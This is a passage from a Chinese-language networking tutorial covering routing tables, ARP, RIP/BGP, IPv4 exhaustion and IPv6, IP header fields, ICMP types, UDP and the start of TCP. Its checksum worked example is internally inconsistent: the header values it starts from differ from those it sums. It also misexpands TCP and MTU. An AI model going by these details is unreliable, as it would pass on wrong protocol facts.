<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Destination        Gateway             Genmask             Iface</span><br><span class="line"><span class="number">199.165</span><span class="number">.145</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>       eth0</span><br><span class="line"><span class="number">199.165</span><span class="number">.146</span><span class="number">.0</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>       eth1</span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>            <span class="number">199.165</span><span class="number">.146</span><span class="number">.8</span>       <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>             eth1</span><br></pre></td></tr></table></figure>
<p>从前两行我们看到，由于 router 横跨 eth0 和 eth1 两个网络，它可以直接通过 eth0 和 eth1 上的网卡直接传送IP包。</p>
<p>第三行表示，如果是前面两行之外的 IP 地址，则需要通过 eth1，送往 199.165.146.8(右边的router)。</p>
<p>我们的目的地符合第二行，所以将IP放入一个新的帧中，</p>
<p>在帧的头部写上 199.165.146.21 的MAC地址，直接发往主机 146.21。</p>
<p>(在Linux下，可以使用 <code>$route -n</code> 来查看 routing table)</p>
<p>IP 包可以进一步接力，到达更远的主机。IP 包从主机出发，根据沿途路由器的 routing table 指导，在 router 间接力。IP 包最终到达某个 router，这个 router 与目标主机位于一个局域网中，可以直接建立连接层的通信。最后，IP 包被送到目标主机。这样一个过程叫做 routing(我们就叫 IP 包接力好了，路由这个词实在是混合了太多的意思)。</p>
<p>整个过程中，IP 包不断被主机和路由封装入帧并拆开，然后借助连接层，在局域网的各个 NIC 之间传送帧。整个过程中，我们的 IP 包的内容保持完整，没有发生变化。最终的效果是一个 IP 包从一个主机传送到另一个主机。利用 IP 包，我们不需要去操心底层(比如连接层)发生了什么。</p>
<h3 id="ARP_u534F_u8BAE"><a href="#ARP_u534F_u8BAE" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>在上面的过程中，我们实际上假设了，每一台主机和路由都能了解局域网内的 IP 地址和 MAC 地址的对应关系，这是实现 IP 包封装(encapsulation)到帧的基本条件。IP 地址与 MAC 地址的对应是通过 ARP 协议传播到局域网的每个主机和路由。每一台主机或路由中都有一个 ARP cache，用以存储局域网内 IP 地址和 MAC 地址如何对应。</p>
<p>ARP 协议(ARP 介于连接层和网络层之间，ARP 包需要包裹在一个帧中)的工作方式如下：主机会发出一个 ARP 包，该 ARP 包中包含有自己的 IP 地址和 MAC 地址。通过 ARP 包，主机以广播的形式询问局域网上所有的主机和路由：我是 IP 地址 xxxx，我的 MAC 地址是 xxxx，有人知道 199.165.146.4 的MAC地址吗？拥有该 IP 地址的主机会回复发出请求的主机：哦，我知道，这个 IP 地址属于我的一个 NIC，它的 MAC 地址是 xxxxxx。由于发送 ARP 请求的主机采取的是广播形式，并附带有自己的 IP 地址和 MAC 地址，其他的主机和路由会同时检查自己的 ARP cache，如果不符合，则更新自己的 ARP cache。</p>
<p>这样，经过几次ARP请求之后，ARP cache会达到稳定。如果局域网上设备发生变动，ARP重复上面过程。</p>
<p>(在 Linux 下，可以使用 <code>$arp</code> 命令来查看 ARP 的过程。ARP 协议只用于 IPv4。IPv6 使用Neighbor Discovery Protocol 来替代 ARP 的功能。)</p>
<p><strong>Routing Table 的生成</strong></p>
<p>我们还有另一个假设，就是每个主机和路由上都已经有了合理的 routing table。这个 routing table描述了网络的拓扑(topology)结构。如果你了解自己的网络连接，可以手写自己主机的 routing table。但是，一个路由器可能有多个出口，所以 routing table 可能会很长。更重要的是，周围连接的其他路由器可能发生变动(比如新增路由器或者路由器坏掉)，我们就需要 routing table 能及时将交通导向其他的出口。我们需要一种更加智能的探测周围的网络拓扑结构，并自动生成 routing table。</p>
<p>一种用来生成 routing table 的协议是 RIP(Routing Information Protocol)。它通过距离来决定 routing table，所以属于 distance-vector protocol。对于RIP来说，所谓的距离是从出发地到目的地途径的路由器数目(hop number)。各个点不断重复RIP广播/计算距离/更新routing table的过程，最终所有的主机和路由器都能生成最合理的路径(merge)。</p>
<p>(RIP的基本逻辑是：如果A距离B为6，而我距离A为1，那么我途径A到B的距离为7)</p>
<p>RIP出于技术上的原因(looping hops)，认为距离超过15的IP不可到达。所以RIP更多用于互联网的一部分(比如整个中国电信的网络)。这样一个互联网的部分往往属于同一个 ISP 或者有同一个管理机构，所以叫做自治系统(AS,autonomous system)。自治系统内部的主机和路由根据通向外部的边界路由器来和其它的自治系统通信。各个边界路由器之间通过 BGP(Border Gateway Protocol)来生成自己前往其它 AS 的 routing table，而自治系统内部则参照边界路由器，使用 RIP 来决定 routing table。BGP 的基本工作过程与 RIP 类似，但在考虑距离的同时，也权衡比如政策、连接性能等其他因素，再决定交通的走向(routing table)。</p>
<h3 id="u5730_u5740_u8017_u5C3D_u5371_u673A"><a href="#u5730_u5740_u8017_u5C3D_u5371_u673A" class="headerlink" title="地址耗尽危机"></a>地址耗尽危机</h3><p>IP 地址是 IP 协议的重要组成部分，它可以识别接入互联网中的任意一台设备。在 IP 接力中，我们已经看到，IP 包的头部写有出发地和目的地的 IP 地址。IP 包上携带的 IP 地址和路由器相配合，最终允许 IP 包从互联网的一台电脑传送到另一台。</p>
<p>在 IP 接力中，我们是以 IPv4 为例说明 IP 包的格式的。IPv4 和 IPv6 是先后出现的两个 IP 协议版本。IPv4 的地址就是一个 32 位的 0/1 序列，比如 11000000 00000000 0000000 00000011。为了方便人类记录和阅读，我们通常将 32 位 0/1 分成 4 段 8 位序列，并用 10 进制来表示每一段(这样，一段的范围就是 0 到 255)，段与段之间以 <code>.</code> 分隔。比如上面的地址可以表示成为 192.0.0.3。IPv6 地址是 128 位 0/1 序列，它也按照 8 位分割，以 16 进制来记录每一段(使用 16 进制而不是 10 进制，这能让写出来的 IPv6 地址短一些)，段与段之间以 <code>:</code> 分隔。</p>
<p>IP地址的分配是一个政策性的问题。ICANN(the Internet Corporation for Assigned Names and Numbers) 是 Internet 的中心管理机构。ICANN 的 IANA(Internet Assigned Numbers Authourity)部门负责将 IP 地址分配给 5 个区域性的互联网注册机构(RIR，Reginal Internet Registry)，比如 APNIC，它负责亚太地区的 IP 分配。然后 RIR 将地址进一步分配给当地的ISP(Internet Service Provider)，比如中国电信和中国网通。ISP 再根据自己的情况，将 IP 地址分配给机构或者直接分配给用户，比如将 A 类地址分配给一个超大型机构，而将 C 类地址分配给一个网吧。机构可以进一步在局域网内部分配 IP 地址给各个主机。(A/B/C类地址请参阅IP接力)</p>
<p>并不是所有的地址都会被分配。一些地址被预留，用于广播、测试、私有网络使用等。这些地址被称为专用地址(special-use address)。你可以查询 RFC5735 来了解哪些地址是专用地址。</p>
<p>(RFC，Request For Comments。RFC是一系列的技术文档，用于记录Internet相关的技术和协议规定。每一个RFC文件都有一个固定的编号。它们是互联网的一个重要财产。你可以通过 <a href="http://www.rfc-editor.org/" target="_blank" rel="external">http://www.rfc-editor.org/</a> 来查找RFC文件)</p>
<p>由于IPv4协议的地址为32位，所以它可以提供 <code>2^32</code> , 也就是大约 40 亿个地址。如果地球人每人一个 IP 地址的话，IPv4 地址已经远远不够。更何况，人均持有的入网设备可能要远多于一个</p>
<p>尽管一些技术措施（比如NAT技术）减缓了情况的紧急程度，但 IPv4 地址耗尽的一天终究还是会很快到来。很明显，我们需要更多的 IP 地址，以满足爆炸式增长的互联网设备对 IP 地址的需求。</p>
<p>IPv6协议的地址最重要的改进就是：加长。IPv6的地址为128位。准确的说，IPv4有4,294,967,296个地址，而IPv6有</p>
<p>340,282,366,920,938,463,374,607,431,768,211,456</p>
<p>个地址。这是怎样一个概念呢？我们可以大概计算一下</p>
<p>地球表面积大约为 510,067,866,000,000 平方米。在一平方厘米(大约是指甲盖大小)的面积内，我们可以有 <code>6.67x10^16</code> 个 IP 地址！所以在短期的时间内，我们应该不会看到 IPv6 被用尽的尴尬。(不排除在未来计算机以分子尺寸出现，那么我们就会有IPv6耗尽危机了)</p>
<p>IPv4 地址正在耗尽，而 IPv6 通过更长的序列提供了更多的 IP 地址。IPv4 向 IPv6 的迁移正在发生。</p>
<p>阻碍迁移的过程的主要在于 IPv4 和 IPv6 格式的不兼容性。老的路由器支持 IPv4 格式的IP包，但它们无法理解 IPv6 格式的 IP 包。所以这一迁移过程必然要伴随者设备的更新。然而，我们的许多互联网资产都是建立在 IPv4 网络上的，不可能一夜之间停止 IPv4 网络的服务而整体迁移到 IPv6 网络中。这一迁移过程注定充满坎坷。</p>
<h3 id="IP__u534F_u8BAE_u8BE6_u89E3"><a href="#IP__u534F_u8BAE_u8BE6_u89E3" class="headerlink" title="IP 协议详解"></a>IP 协议详解</h3><p>在粗略了解了IP接力和IP地址后，我们再反过来，看一看IP协议的具体细节和设计哲学。</p>
<p>我们已经在IP接力中介绍过，一个IP包分为头部(header)和数据(payload/data)两部分。头部是为了实现IP通信必须的附加信息，数据是IP通信所要传送的信息。</p>
<p><img src="/images/14551393750144.jpg" alt=""></p>
<p><strong>黄色区域 (同名区域)</strong></p>
<p>我们看到，三个黄色区域跨越了 IPv4 和 IPv6。Version(4位)用来表明 IP 协议版本，是 IPv4 还是 IPv6(IPv4, Version=0100; IPv6, Version=0110)。Source Adrresss 和 Destination Address 分别为发出地和目的地的 IP 地址。</p>
<p><strong>蓝色区域 （名字发生变动的区域）</strong></p>
<p>Time to Live 存活时间(Hop Limit in IPv6)。Time to Live 最初是表示一个 IP 包的最大存活时间：如果 IP 包在传输过程中超过 Time to Live，那么 IP 包就作废。后来，IPv4 的这个区域记录一个整数(比如30)，表示在 IP 包接力过程中最多经过30个路由接力，如果超过30个路由接力，那么这个 IP 包就作废。IP 包每经过一个路由器，路由器就给 Time to Live 减一。当一个路由器发现 Time to Live 为0时，就不再发送该 IP 包。IPv6 中的 Hop Limit 区域记录的也是最大路由接力数，与 IPv4 的功能相同。Time to Live/Hop Limit 避免了 IP 包在互联网中无限接力。</p>
<p>Type of Service 服务类型(Traffic Class in IPv6)。Type of Service 最初是用来给 IP 包分优先级，比如语音通话需要实时性，所以它的 IP 包应该比 Web 服务的 IP 包有更高的优先级。然而，这个最初不错的想法没有被微软采纳。在Windows下生成的 IP 包都是相同的最高优先级，所以在当时造成 Linux 和 Windows 混合网络中，Linux 的 IP 传输会慢于 Windows (仅仅是因为Linux更加守规矩！)。后来，Type of Service 被实际分为两部分：Differentiated Service Field (DS, 前6位)和 Explicit Congestion Notification (ECN, 后2位)，前者依然用来区分服务类型，而后者用于表明 IP 包途径路由的交通状况。IPv6 的T raffic Class 也被如此分成两部分。通过IP包提供不同服务的想法，并针对服务进行不同的优化的想法已经产生很久了，但具体做法并没有形成公认的协议。比如 ECN 区域，它用来表示 IP 包经过路径的交通状况。如果接收者收到的 ECN 区域显示路径上的很拥挤，那么接收者应该作出调整。但在实际上，许多接收者都会忽视 ECN 所包含的信息。交通状况的控制往往由更高层的比如 TCP 协议实现。</p>
<p>Protocol 协议(Next Header in IPv6)。Protocol 用来说明 IP 包 Payload 部分所遵循的协议，也就是 IP 包之上的协议是什么。它说明了 IP 包封装的是一个怎样的高层协议包(TCP? UDP?)。</p>
<p>Total Length, 以及 IPv6 中 Payload Length 的讨论要和 IHL 区域放在一起，我们即将讨论。</p>
<p><strong>红色区域 (IPv6中删除的区域)</strong></p>
<p>我们看一下 IPv4 和 IPv6 的长度信息。IPv4 头部的长度。在头部的最后，是 options。每个 options 有32位，是选填性质的区域。一个 IPv4 头部可以完全没有 options 区域。不考虑 options 的话，整个 IPv4 头部有 20 bytes(上面每行为4 bytes)。但由于有 options 的存在，整个头部的总长度是变动的。我们用 IHL(Internet Header Length)来记录头部的总长度，用 Total Length 记录整个 IP 包的长度。IPv6 没有 options，它的头部是固定的长度 40 bytes，所以 IPv6 中并不需要 IHL 区域。Payload Length 用来表示 IPv6 的数据部分的长度。整个 IP 包为 40 bytes + Payload Length。</p>
<p>IPv4 中还有一个 Header Checksum 区域。这个 checksum 用于校验 IP 包的头部信息。Checksum 与之前的 CRC 算法并不相同。IPv6 则没有 checksum 区域。IPv6 包的校验依赖高层的协议来完成，这样的好处是免去了执行 checksum 校验所需要的时间，减小了网络延迟 (latency)。</p>
<p>Identification, flags 和 fragment offset，这三个包都是为碎片化(fragmentation)服务的。碎片化是指一个路由器将接收到的 IP 包分拆成多个 IP 包传送，而接收这些“碎片”的路由器或者主机需要将“碎片”重新组合(reassembly)成一个 IP 包。不同的局域网所支持的最大传输单元(MTU, Maximum Transportation Unit)不同。如果一个 IP 包的大小超过了局域网支持的MTU，就需要在进入该局域网时碎片化传输(就好像方面面面饼太大了，必须掰碎才能放进碗里)。碎片化会给路由器和网络带来很大的负担。最好在 IP 包发出之前探测整个路径上的最小 MTU，IP 包的大小不超过该最小MTU，就可以避免碎片化。IPv6 在设计上避免碎片化。每一个 IPv6 局域网的 MTU 都必须大于等于1280 bytes。IPv6 的默认发送 IP 包大小为 1280 bytes。</p>
<p><strong>绿色区域 (IPv6新增区域)</strong></p>
<p>Flow Label 是 IPv6 中新增的区域。它被用来提醒路由器来重复使用之前的接力路径。这样IP包可以自动保持出发时的顺序。这对于流媒体之类的应用有帮助。Flow label 的进一步使用还在开发中。</p>
<p><strong>我尽力</strong></p>
<p>IP 协议在产生时是一个松散的网络，这个网络由各个大学的局域网相互连接成的，由一群碰头垢面的 Geek 维护。所以，IP 协议认为自己所处的环境是不可靠(unreliable)的：诸如路由器坏掉、实验室失火、某个 PhD 踢掉电缆之类的事情随时会发生。</p>
<p>这样的凶险环境下，IP 协议提供的传送只能是“我尽力” (best effort)式的。所谓的“我尽力”，其潜台词是，如果事情出错不要怪我，我只是答应了尽力，可没保证什么。所以，如果 IP 包传输过程中出现错误(比如 checksum 对不上，比如交通太繁忙，比如超过 Time to Live)，根据 IP 协议，你的 IP 包会直接被丢掉。Game Over, 不会再有进一步的努力来修正错误。Best effort让IP协议保持很简单的形态。更多的质量控制交给高层协议处理，IP协议只负责有效率的传输。</p>
<p>“效率优先”也体现在IP包的顺序(order)上。即使出发地和目的地保持不变，IP 协议也不保证 IP 包到达的先后顺序。我们已经知道，IP 接力是根据 routing table 决定接力路线的。如果在连续的 IP 包发送过程中，routing table 更新(比如有一条新建的捷径出现)，那么后发出的 IP 包选择走不一样的接力路线。如果新的路径传输速度更快，那么后发出的 IP 包有可能先到。这就好像是多车道的公路上，每辆车都在不停变换车道，最终所有的车道都塞满汽车。这样可以让公路利用率达到最大。</p>
<p>IPv6 中的 Flow Label 可以建议路由器将一些 IP 包保持一样的接力路径。但这只是“建议”，路由器可能会忽略该建议。</p>
<h3 id="Header_Checksum_u7B97_u6CD5"><a href="#Header_Checksum_u7B97_u6CD5" class="headerlink" title="Header Checksum算法"></a>Header Checksum算法</h3><p>Header Checksum 区域有 16 位。它是这样获得的，从 header 取得除 checksum 之外的0/1序列，比如：</p>
<p>9194 8073 0000 4000 4011 C0A8 0001 C0A8 00C7 (十六进制 hex, 这是一个为演示运算过程而设计的header)</p>
<p>按照十六位(也就是 4 位 hex)分割整个序列。将分割后的各个 4 位 hex 累积相加。如果有超过 16 位的进位出现，则将进位加到后 16 位结果的最后一位：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  Binary                Hex</span><br><span class="line">  <span class="number">1001000110010100</span>      <span class="number">9194</span></span><br><span class="line">+ <span class="number">1000000001110011</span>      <span class="number">8073</span></span><br><span class="line">  ----------------</span><br><span class="line"><span class="number">1</span> <span class="number">0001001000000111</span>     <span class="number">11207</span></span><br><span class="line">+                <span class="number">1</span></span><br><span class="line">  ----------------</span><br><span class="line">  <span class="number">0001001000001000</span>      <span class="number">1208</span></span><br></pre></td></tr></table></figure>
<p>上面的计算叫做 one’s complement sum。求得所有十六位数的和，</p>
<p>one’s complement sum(4500, 0073, 0000, 4000, 4011, C0A8, 0001, C0A8, 00C7) = 1433</p>
<p>然后，将1433的每一位取反(0-&gt;1, 1-&gt;0)， 就得到checksum：EBCC</p>
<p>这样，我们的header就是:</p>
<p>9194 8073 0000 4000 4011 EBCC C0A8 0001 C0A8 00C7</p>
<p>IP 包的接收方在接收到 IP 包之后，可以求上面各个 16 位数的 one’s complement sum，应该得到 FFFF。如果不是 FFFF，那么 header 是不正确的，整个 IP 包会被丢弃。</p>
<p>(再次提醒，示例所用的 IP header 不是真实的 header，它只是起演示算法的作用)</p>
<p>每个网络协议的形成都有其历史原因。比如 IP 协议是为了将各个分散的实验室网络连接起来。由于当时的网络很小，所以 IPv4(IPv4产生与70年代)的地址总量为 40 亿。尽管当时被认为是很大的数字，但数字浪潮很快带来了地址耗尽危机。IPv6 的主要目的是增加 IPv4 的地址容量，但同时根据 IPv4 的经验和新时代的技术进步进行改进，比如避免碎片化，比如取消 checksum (由于高层协议 TCP 的广泛使用)。网络协议技术上并不复杂，更多的考量是政策性的。</p>
<p>IP协议是”Best Effort”式的，IP传输是不可靠的。但这样的设计成就了IP协议的效率。</p>
<h3 id="ICMP_u534F_u8BAE"><a href="#ICMP_u534F_u8BAE" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>到现在为止，我们讲解了网络层中最重要的IP协议。IP协议的一个重要补充是是ICMP协议。</p>
<p>ICMP(Internet Control Message Protocol)是介于网络层和传输层的协议。它的主要功能是传输网络诊断信息。</p>
<p>ICMP传输的信息可以分为两类，一类是错误(error)信息，这一类信息可用来诊断网络故障。我们已经知道，IP协议的工作方式是“Best Effort”，如果IP包没有被传送到目的地，或者IP包发生错误，IP协议本身不会做进一步的努力。但上游发送 IP 包的主机和接力的路由器并不知道下游发生了错误和故障，它们可能继续发送 IP 包。通过 ICMP 包，下游的路由器和主机可以将错误信息汇报给上游，从而让上游的路由器和主机进行调整。需要注意的是，ICMP 只提供特定类型的错误汇报，它不能帮助 IP 协议成为“可靠”(reliable)的协议。另一类信息是咨询(Informational)性质的，比如某台计算机询问路径上的每个路由器都是谁，然后各个路由器同样用 ICMP 包回答。</p>
<p>(ICMP 基于 IP 协议。也就是说，一个 ICMP 包需要封装在 IP 包中，然后在互联网传送。ICMP 是 IP 套装的必须部分，也就是说，任何一个支持 IP 协议的计算机，都要同时实现 ICMP。)</p>
<p>ICMP包的结构：</p>
<p><img src="/images/14551393925085.jpg" alt=""></p>
<p>ICMP 包都会有 Type, Code 和 Checksum 三部分。Type 表示 ICMP 包的大的类型，而 Code 是一个 Type 之内细分的小类型。针对不同的错误信息或者咨询信息，会有不同的 Type 和 Code。从上面我们可以看到，ICMP 支持的类型非常多，就好像瑞士军刀一样，有各种各样的功能。Checksum 与 IP 协议的 header checksum 相类似，但与 IP 协议中 checksum 只校验头部不同，这里的 Checksum 所校验的是整个 ICMP 包(包括头部和数据)。</p>
<p>余下的 ICMP 包格式根据不同的类型不同。另一方面，ICMP 包通常是由某个 IP 包触发的。这个触发 IP 包的头部和一部份数据会被包含在 ICMP 包的数据部分。</p>
<p>ICMP 协议是实现 ping 命令和 traceroute 命令的基础。这两个工具常用于网络排错。</p>
<h3 id="u5E38_u89C1_u7684ICMP_u5305_u7C7B_u578B"><a href="#u5E38_u89C1_u7684ICMP_u5305_u7C7B_u578B" class="headerlink" title="常见的ICMP包类型"></a>常见的ICMP包类型</h3><p><strong>回音</strong></p>
<p>回音(Echo)属于咨询信息。ping 命令就是利用了该类型的 ICMP包。当使用 ping 命令的时候，将向目标主机发送Echo-询问类型的 ICMP 包，而目标主机在接收到该 ICMP 包之后，会回复Echo-回答类型的 ICMP 包，并将询问 ICMP 包包含在数据部分。ping 命令是我们进行网络排查的一个重要工具。如果一个 IP 地址可以通过 ping 命令收到回复，那么其他的网络协议通信方式也很有可能成功。</p>
<p><strong>源头冷却</strong></p>
<p>源头冷却(source quench)属于错误信息。如果某个主机快速的向目的地传送数据，而目的地主机没有匹配的处理能力，目的地主机可以向出发主机发出该类型的 ICMP 包，提醒出发主机放慢发送速度。</p>
<p><strong>目的地无法到达</strong></p>
<p>目的地无法到达(Destination Unreachable)属于错误信息。如果一个路由器接收到一个没办法进一步接力的 IP 包，它会向出发主机发送该类型的 ICMP 包。比如当 IP 包到达最后一个路由器，路由器发现目的地主机 down 机，就会向出发主机发送目的地无法到达(Destination Unreachable)类型的 ICMP 包。目的地无法到达还可能有其他的原因，比如不存在接力路径，比如不被接收的端口号等等。</p>
<p><strong>超时</strong></p>
<p>超时(Time Exceeded)属于错误信息。IPv4 中的 Time to Live(TTL)和 IPv6 中的 Hop Limit会随着经过的路由器而递减，当这个区域值减为 0 时，就认为该 IP 包超时(Time Exceeded)。Time Exceeded 就是 TTL 减为 0 时的路由器发给出发主机的 ICMP 包，通知它发生了超时错误。</p>
<p>traceroute 就利用了这种类型的ICMP包。traceroute 命令用来发现 IP 接力路径(route)上的各个路由器。它向目的地发送 IP 包，第一次的时候，将 TTL 设置为 1，引发第一个路由器的 Time Exceeded 错误。这样，第一个路由器回复 ICMP 包，从而让出发主机知道途径的第一个路由器的信息。随后 TTL 被设置为 2、3、4，…，直到到达目的主机。这样，沿途的每个路由器都会向出发主机发送 ICMP 包来汇报错误。traceroute 将 ICMP 包的信息打印在屏幕上，就是接力路径的信息了。</p>
<p><strong>重新定向</strong></p>
<p>重新定向(redirect)属于错误信息。当一个路由器收到一个 IP 包，对照其 routing table，发现自己不应该收到该 IP 包，它会向出发主机发送重新定向类型的 ICMP，提醒出发主机修改自己的routing table。比如下面的网络：</p>
<p><img src="/images/14551394092221.jpg" alt=""></p>
<p>假如 145.1 发送到 145.15 的 IP 包，结果被中间的路由器通过 145.17 的 NIC 收到。那么路由器会发现，根据自己的 routing table，这个 IP 包要原路返回。那么 router 就可以判断出 145.1 的 routing table 可能有问题。所以路由器会向 145.1 发送 redirect 类型的 ICMP 包。</p>
<p><strong>IPv6 的 Neighbor Discovery</strong></p>
<p>ARP 协议用于发现周边的 IP 地址和 MAC 地址的对应。然而，ARP 协议只用于 IPv4，IPv6 并不使用 ARP 协议。IPv6 包通过邻居探索(ND, Neighbor Discovery)来实现 ARP 的功能。ND 的工作方式与 ARP 类似，但它基于 ICMP 协议。ICMP 包有 Neighbor Solicitation 和 Neighbor Advertisement 类型。这两个类型分别对应ARP协议的询问和回复信息。</p>
<p>ICMP 协议是 IP 协议的排错帮手，它可以帮助人们及时发现 IP 通信中出现的故障。基于 ICMP 的 ping 和 traceroute 也构成了重要的网络诊断工具。然而，需要注意的是，尽管 ICMP 的设计是出于好的意图，但 ICMP 却经常被黑客借用进行网络攻击，比如利用伪造的 IP 包引发大量的 ICMP 回复，并将这些 ICMP 包导向受害主机，从而形成 DoS 攻击。而 redirect 类型的 ICMP 包可以引起某个主机更改自己的 routing table，所以也被用作攻击工具。许多站点选择忽视某些类型的 ICMP 包来提高自身的安全性。</p>
<h2 id="u4F20_u8F93_u5C42_u534F_u8BAE"><a href="#u4F20_u8F93_u5C42_u534F_u8BAE" class="headerlink" title="传输层协议"></a>传输层协议</h2><h3 id="UDP_u534F_u8BAE"><a href="#UDP_u534F_u8BAE" class="headerlink" title="UDP协议"></a>UDP协议</h3><p>我们已经讲解了物理层、连接层和网络层。最开始的连接层协议种类繁多(Ethernet、Wifi、ARP等等)。到了网络层，我们只剩下一个 IP 协议(IPv4和IPv6是替代关系)。进入到传输层(transport layer)，协议的种类又开始繁多起来(比如 TCP、UDP、SCTP 等)。这就好像下面的大树，根部(连接层)分叉很多，然后统一到一个树干(网络层)，到了树冠(传输层)部分又开始开始分叉，而每个树枝上长出更多的树叶(应用层)。我们在网络层已经看到，通过树干的统一，我们实现了一个覆盖全球的互联网络(Internet)。然而，我们可能出于不同的目的利用这张“网”，随之使用的方式也有所区分。不同的传输层协议(以及更多的应用层协议)正是我们使用“网”的不同方式的体现。</p>
<p>传输层最重要的协议为 TCP 协议和 UDP 协议。这两者使用“网”的方式走了两个极端。两个协议的对比非常有趣。TCP 协议复杂，但传输可靠。UDP 协议简单，但传输不可靠。其他的各个传输层协议在某种程度上都是这两个协议的折中。我们先来看传输层协议中比较简单的 UDP 协议。</p>
<p>UDP(User Datagram Protocol)传输与 IP 传输非常类似。你可以将 UDP 协议看作 IP 协议暴露在传输层的一个接口。UDP 协议同样以数据包(datagram)的方式传输，它的传输方式也是”Best Effort”的，所以 UDP 协议也是不可靠的(unreliable)。那么，我们为什么不直接使用 IP 协议而要额外增加一个 UDP 协议呢？一个重要的原因是 IP 协议中并没有端口(port)的概念。IP 协议进行的是 IP 地址到 IP 地址的传输，这意味者两台计算机之间的对话。但每台计算机中需要有多个通信通道，并将多个通信通道分配给不同的进程使用。一个端口就代表了这样的一个通信通道。正如我们在邮局和邮差中提到的收信人的概念一样。UDP 协议实现了端口，从而让数据包可以在送到 IP 地址的基础上，进一步可以送到某个端口。</p>
<p>尽管 UDP 协议非常简单，但它的产生晚于更加复杂的 TCP 协议。早期的网络开发者开发出 IP 协议和 TCP 协议分别位于网络层和传输层，所有的通信都要先经过 TCP 封装，再经过 IP 封装(应用层-&gt;TCP-&gt;IP)。开发者将 TCP/IP 视为相互合作的套装。但很快，网络开发者发现，IP 协议的功能和 TCP 协议的功能是相互独立的。对于一些简单的通信，我们只需要“Best Effort”式的 IP 传输就可以了，而不需要 TCP 协议复杂的建立连接的方式(特别是在早期网络环境中，如果过多的建立 TCP 连接，会造成很大的网络负担，而 UDP 协议可以相对快速的处理这些简单通信)。UDP 协议随之被开发出来，作为 IP 协议在传输层的”傀儡”。这样，网络通信可以通过应用层-&gt;UDP-&gt;IP 的封装方式，绕过 TCP 协议。由于 UDP 协议本身异常简单，实际上只为 IP 传输起到了桥梁的作用。我们将在 TCP 协议的讲解中看到更多 TCP 协议和 UDP 协议的对比。</p>
<p>UDP 的数据包同样分为头部(header)和数据(payload)两部分。UDP 是传输层(transport layer)协议，这意味着 UDP 的数据包需要经过 IP 协议的封装(encapsulation)，然后通过 IP 协议传输到目的电脑。随后 UDP 包在目的电脑拆封，并将信息送到相应端口的缓存中。</p>
<p><strong>UDP协议的头部</strong></p>
<p><img src="/images/14551394375473.jpg" alt=""></p>
<p>上面的 source port 和 destination port 分别为 UDP 包的出发端口和目的地端口。Length 为整个 UDP 包的长度。</p>
<p>checksum 的算法与 IP 协议的 header checksum 算法相类似。然而，UDP 的 checksum 所校验的序列包括了整个 UDP 数据包，以及封装的 IP 头部的一些信息(主要为出发地 IP 和目的地 IP)。这样，checksum 就可以校验 IP：端口的正确性了。在 IPv4 中，checksum 可以为 0，意味着不使用 checksum。IPv6 要求必须进行 checksum 校验。</p>
<p><strong>端口与 socket</strong></p>
<p>端口(port)是伴随着传输层诞生的概念。它可以将网络层的 IP 通信分送到各个通信通道。UDP 协议和 TCP 协议尽管在工作方式上有很大的不同，但它们都建立了从一个端口到另一个端口的通信。</p>
<p>随着我们进入传输层，我们也可以调用操作系统中的 API，来构建 socket。Socket 是操作系统提供的一个编程接口，它用来代表某个网络通信。应用程序通过 socket 来调用系统内核中处理网络协议的模块，而这些内核模块会负责具体的网络协议的实施。这样，我们可以让内核来接收网络协议的细节，而我们只需要提供所要传输的内容就可以了，内核会帮我们控制格式，并进一步向底层封装。因此，在实际应用中，我们并不需要知道具体怎么构成一个 UDP 包，而只需要提供相关信息(比如 IP 地址，比如端口号，比如所要传输的信息)，操作系统内核会在传输之前会根据我们提供的相关信息构成一个合格的 UDP 包(以及下层的包和帧)。socket 是一个比较大的课题，在这里不会过多深入。</p>
<p>端口是传输层带来的最重要的概念。我们进一步了解了 UDP 协议。如果已经掌握了 IP 协议，那么 UD P协议就没有任何困难可言，它只是 IP 协议暴露在传输层上的接口。</p>
<h3 id="TCP_u534F_u8BAE_u4E0E_u6D41_u901A_u4FE1"><a href="#TCP_u534F_u8BAE_u4E0E_u6D41_u901A_u4FE1" class="headerlink" title="TCP协议与流通信"></a>TCP协议与流通信</h3><p>TCP(Transportation Control Protocol)协议与 IP 协议是一同产生的。事实上，两者最初是一个协议，后来才被分拆成网络层的 IP 和传输层的 TCP。我们已经在 UDP 协议中介绍过，UDP 协议是 IP 协议在传输层的“傀儡”，用来实现数据包形式的通信。而 TCP 协议则实现了“流”形式的通信。</p>
<p>TCP的内容非常丰富。我不能在一篇文章中将TCP讲完。这一篇主要介绍TCP协议的下面几个方面：</p>
<ol>
<li>“流”通信的意义与实现方式</li>
<li>如何实现可靠传输</li>
<li>使用滑窗提高效率</li>
</ol>
<p>TCP 协议是传输层协议，实现的是端口到端口(port)的通信。更进一步，TCP 协议虚拟了文本流(byte stream)的通信。在 Linux 文本流中我们谈到，计算机数据的本质是有序的 0/1 序列 (如果以 byte为单位，就叫做文本流)。计算机的功能就是储存和处理文本流。CPU + memory + 存储设备实现了文本流在同一台计算机内部的加工处理。通过一些 IO，比如屏幕和键盘，文本流实现了人机交互。而进一步，如果网络通信可在不同计算机之间进行文本流的交互，那么我们就和整个计算机系统的数据处理方式实现了对接。</p>
